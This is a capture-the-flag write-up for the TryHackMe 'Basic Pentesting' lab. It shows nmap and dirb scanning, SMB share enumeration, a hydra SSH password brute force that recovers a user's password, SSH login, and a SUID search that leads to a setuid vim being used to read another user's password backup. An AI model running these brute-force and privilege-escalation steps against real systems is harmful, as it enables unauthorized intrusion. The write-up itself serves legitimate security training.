# Room Information

Room link: https://tryhackme.com/room/basicpentestingjt

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 07/02/2023

# Scanning and Enumeration
> Port Scanning Using Nmap
1. Started up this room’s machine
2. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt` to perform a network scan to scan for open ports while utilizing default scripts (-sC) and version detection (-sV) to identify services, as well as their versions, and vulnerabilities on the target system, and then redirect the results into a text file
3. `cat {FILENAME1}.txt` to output the scan results from the previous command
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 10.10.254.39 > PortScan.txt
```
```bash
┌──(kali㉿kali)-[~]
└─$ cat PortScan.txt                         
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 15:03 EDT
Nmap scan report for 10.10.254.39
Host is up (0.10s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db45cbbe4a8b71f8e93142aefff845e4 (RSA)
|   256 09b9b91ce0bf0e1c6f7ffe8e5f201bce (ECDSA)
|_  256 a5682b225f984a62213da2e2c5a9f7c2 (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m03s, deviation: 2h18m34s, median: 2s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2023-06-27T15:03:31-04:00
| smb2-time: 
|   date: 2023-06-27T19:03:31
|_  start_date: N/A
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.79 seconds
```

#
> Scanning for Hiddent Web Directories Using Dirb
4. `dirb http://{TARGET IP} -r > {FILENAME2}.txt` to non-recursively scan the target URL for directories using Dirb's default wordlist and then redirecting the results into a text file
5. `cat {FILENAME2}.txt` to output the scan results from the previous command
```bash
┌──(kali㉿kali)-[~]
└─$ dirb http://10.10.254.39 -r > WebDirectoryScan.txt
```
```bash
┌──(kali㉿kali)-[~]
└─$ cat WebDirectoryScan.txt 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Jun 27 15:03:43 2023
URL_BASE: http://10.10.254.39/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.254.39/ ----
==> DIRECTORY: http://10.10.254.39/development/                   
+ http://10.10.254.39/index.html (CODE:200|SIZE:158)            
+ http://10.10.254.39/server-status (CODE:403|SIZE:300)                                                           
-----------------
END_TIME: Tue Jun 27 15:10:41 2023
DOWNLOADED: 4612 - FOUND: 2
```

#
> Scanning the Target's Hidden Directory
6. `firefox "http://{TARGET-IP}/{HIDDEN-DIRECTORY}"` to laucnh Firefox and redirect it to the target's hidden directory, which revealed two text files

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Basic%20Pentesting/Development%20Directory.png)
7. `curl http://10.10.254.39/{HIDDEN DIRECTORY}/{FILE1}.txt` to retrieve the data from the first text file from the target's hidden directory, which revealed that the target has a running SMB server 
8. `curl http://10.10.254.39/{HIDDEN DIRECTORY}/{FILE2}.txt` to retrieve the data from the second text file from the target's hidden directory 
```bash
┌──(kali㉿kali)-[~]
└─$ curl http://10.10.254.39/development/dev.txt

2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```
```bash
┌──(kali㉿kali)-[~]
└─$ curl http://10.10.254.39/development/j.txt  
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

#
> Scanning the Target's SMB server
9. `smbmap -L //{TARGET IP}` to enumerate and list the available shares on the target's SMB server
10. `smbclient //{TARGET IP}/{SHARENAME1} -c "ls"`
11. `smbclient //{TARGET IP/{USER} -c "get {FILE3}.txt"`
12. `cat {FILE3}.txt`
```bash
┌──(kali㉿kali)-[~]
└─$ smbclient -L //10.10.254.39               
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        Anonymous       Disk      
        IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            BASIC2
```
```bash
┌──(kali㉿kali)-[~]
└─$ smbclient //10.10.254.39/Anonymous -c "ls"
Password for [WORKGROUP\kali]:
  .                                   D        0  Thu Apr 19 13:31:20 2018
  ..                                  D        0  Thu Apr 19 13:13:06 2018
  staff.txt                           N      173  Thu Apr 19 13:29:55 2018

                14318640 blocks of size 1024. 11094332 blocks available
```
```bash
┌──(kali㉿kali)-[~]
└─$ smbclient //10.10.254.39/Anonymous -c "get staff.txt"
Password for [WORKGROUP\kali]:
getting file \staff.txt of size 173 as staff.txt (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
```
```bash
┌──(kali㉿kali)-[~]
└─$ cat staff.txt              
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
```

# Vulnerability Exploitation
> Brute Forcing Using Hydra
13. `hydra -l {USER2} -P {WORDLIST PATH} ssh//{TARGET IP}`
```bash
┌──(kali㉿kali)-[~]
└─$ hydra -l jan -P rockyou.txt ssh://10.10.254.39
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-27 16:08:20
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.10.254.39:22/
[STATUS] 156.00 tries/min, 156 tries in 00:01h, 14344244 to do in 1532:31h, 14 active
[STATUS] 107.67 tries/min, 323 tries in 00:03h, 14344077 to do in 2220:27h, 14 active
[STATUS] 102.00 tries/min, 714 tries in 00:07h, 14343686 to do in 2343:45h, 14 active
[22][ssh] host: 10.10.254.39   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-27 16:16:39
```

#
> Connecting Through SSH
14. `ssh {USER2}@{TARGET IP} -p 22`
```bash
┌──(kali㉿kali)-[~]
└─$ ssh jan@10.10.254.39 -p 22    
The authenticity of host '10.10.254.39 (10.10.254.39)' can't be established.
ED25519 key fingerprint is SHA256:XKjDkLKocbzjCch0Tpriw1PeLPuzDufTGZa4xMDA+o4.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.254.39' (ED25519) to the list of known hosts.
jan@10.10.254.39's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Mon Apr 23 15:55:45 2018 from 192.168.56.102
jan@basic2:~$ 
```
15. `whoami`
16. `ls`
17. `ls /`
18. `ls /home`
19. `ls /home/kay`
20. `cat /home/kay/{FILE4}.bak` to output the contents of the backup file onto our terminal, which ended up not working since the current user we're running as doesn't have the necessary permissions to run that command
```bash
jan@basic2:~$ ls
```
```bash
jan@basic2:~$ ls /
bin   dev  home        initrd.img.old  lib64       media  opt   root  samba  snap  sys  usr  vmlinuz
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   sbin   srv   tmp  var  vmlinuz.old
```
```bash
jan@basic2:~$ ls /home
jan  kay
```
```bash
jan@basic2:~$ ls /home/kay
pass.bak
```
```bash
jan@basic2:~$ cat /home/kay/pass.bak
cat: /home/kay/pass.bak: Permission denied
```


# Post Exploitation
> Privilege Escalation
21. `sudo -l` to list the privileges or permissions that the current user has with the **sudo** command
```bash
jan@basic2:~$ sudo -l
[sudo] password for jan: 
Sorry, user jan may not run sudo on basic2.
```
22. `find / -perm -u=s -type f 2>/dev/null` to search for files on the target's system that has the setuid permission bit set while redirecting any error messages to the /dev/null file
```bash
jan@basic2:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/vim.basic
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/passwd
/bin/su
/bin/ntfs-3g
/bin/ping6
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
```
23. `vim {FILE4}.bak` to open the backup file with the Vim text editor, which ended up revealing the final password for this challenge 

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Basic%20Pentesting/vim.png)

**Romm completed!**

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/TryHackMe%20-%20Basic%20Pentesting.png)

# Command History
1. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
2. `cat {FILENAME1}.txt`
3. `dirb http://{TARGET IP} -r > {FILENAME2}.txt`
4. `cat {FILENAME2}.txt`
5. `firefox "http://{TARGET-IP}/{HIDDEN-DIRECTORY}"`
6. `curl http://10.10.254.39/{HIDDEN DIRECTORY}/{FILE1}.txt`
7. `curl http://10.10.254.39/{HIDDEN DIRECTORY}/{FILE2}.txt`
8. `smbmap -L {TARGET IP}`
9. `smbclient //{TARGET IP}/{SHARENAME1} -c "ls"`
10. `smbclient //{TARGET IP/{USER} -c "get {FILE3}.txt"`
11. `cat {FILE3}.txt`
12. `hydra -l {USER2} -P {WORDLIST PATH} ssh//{TARGET IP}`
13. `ssh {USER2}@{TARGET IP} -p 22`
14. `whoami`
15. `ls`
16. `ls /`
17. `ls /home`
18. `ls /home/kay`
19. `cat /home/kay/{FILE4}.bak`
20. `sudo -l`
21. `find / -perm -u=s -type f 2>/dev/null`
22. `vim {FILE4}.bak`

# Dissecting Some Commands
`nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
+ `-sC` enables the use of default scripts during the scan, which runs a set of commonly used scripts against the target IP to try to find any vulnerabilities
+ `-sV` enables version detection, which attempts to determine the sevice and version information of the open ports
+ `> {FILENAME1}.txt` redirects the results into a text file


`hydra -l {USER2} -P {WORDLIST PATH} ssh//{TARGET IP}`
+ `-l {USER2}` specifies that {USER2} is the username to be used during the attack
+ `-P {FILE1}.txt` specifies the file containing the list of passwords to be used for the brute-force attack, for which we used the **rockyou.txt** wordlist 
+ `ssh://{TARGET IP}` specifies the protocol and the target IP that we want to attack


`find / -perm -u=s -type f 2>/dev/null`
+ `/` specifies the starting directory to be the root of the filesystem
+ `-perm -u=s` specifies that the files must match with the SetUID permissions for the owner, which is the user that we're currently logged in as 
+ `type -f` specifies that only regular files should be considered in the search
+ `2>/dev/null` redirects error messages to the /dev/null file, which discards them from the output

# Contributions
This writeup was made by Jonmar Corpuz, founder of **KnowCybersecurity** (www.knowwwcybersecurity.com)


Socials:
* TryHackMe ID: https://tryhackme.com/p/mtlfriends
* LinkedIn: https://www.linkedin.com/in/jonmar-corpuz-12771a234/



